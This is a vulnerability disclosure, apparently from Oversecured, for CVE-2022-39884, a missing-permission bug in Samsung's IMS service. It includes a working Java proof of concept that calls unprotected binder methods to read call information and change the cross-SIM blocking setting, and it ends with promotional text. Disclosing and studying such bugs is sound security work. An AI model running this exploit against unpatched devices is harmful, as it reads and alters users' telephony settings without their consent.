# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Android Framework</td>
    </tr>
    <tr>
        <td>Library path</td>
        <td><code>/system/priv-app/imsservice/imsservice.apk</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.07.15</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.11.08</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39884">CVE-2022-39884</a> (SVE-2022-1704)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$220</td>
    </tr>
</table>

# Description

The `secims` system service (`com.sec.ims.IImsService`) contained the following methods, which were not protected by any permissions:
- `getCmcCallInfo()`
- `setCrossSimPermanentBlocked()`
- `setNrInterworkingMode()`
- `setVideocallType()`

They allowed both to read the current system settings and to change them.

**Proof of Concept**

This code logs the result of a call to `IImsService.getCmcCallInfo()` and changes the setting `IImsService.setCrossSimPermanentBlocked(0, true)`:
```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    try {
        IBinder binder = getService("secims");
        getCmcCallInfo(binder);
        setCrossSimPermanentBlocked(binder);
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

static final int TRANSACTION_getCmcCallInfo = 93;

private void getCmcCallInfo(IBinder binder) throws Throwable {
    Parcel parcel = Parcel.obtain();
    parcel.writeInterfaceToken(binder.getInterfaceDescriptor());

    Parcel reply = Parcel.obtain();

    binder.transact(TRANSACTION_getCmcCallInfo, parcel, reply, 0);
    reply.readException();

    if (reply.readBoolean()) {
        Log.d("evil", "Reply: " + CmcCallInfo.CREATOR.createFromParcel(reply));
    }
}

static final int TRANSACTION_setCrossSimPermanentBlocked = 124;

private void setCrossSimPermanentBlocked(IBinder binder) throws Throwable {
    Parcel parcel = Parcel.obtain();
    parcel.writeInterfaceToken(binder.getInterfaceDescriptor());
    parcel.writeInt(0);
    parcel.writeBoolean(true);

    Parcel reply = Parcel.obtain();

    binder.transact(TRANSACTION_setCrossSimPermanentBlocked, parcel, reply, 0);
    reply.readException();
}

private IBinder getService(String name) throws Throwable {
    return (IBinder) Class.forName("android.os.ServiceManager")
            .getDeclaredMethod("getServiceOrThrow", String.class)
            .invoke(null, name);
}
```

## References

- [Oversecured Blog. Discovering vendor-specific vulnerabilities in Android](https://blog.oversecured.com/Discovering-vendor-specific-vulnerabilities-in-Android/)

## Conclusion

Mobile app security is more critical than ever in today's digital landscape. As we have shown through our research, even the most reputable brands are not immune to the threat of cyberattacks. 

At Oversecured, we are committed to help our clients stay ahead of the curve with our industry-leading mobile app vulnerability scanning technology. With our comprehensive approach to mobile app security, you can trust that your brand and your users are protected from data breaches and other security threats.

Don't wait until it's too late. [Get a free consultation](https://oversecured.com/contact-us?utm_source=github&utm_medium=article&utm_campaign=samsung2022) and find out how we can help secure your mobile apps. Together, we can build a safer digital world.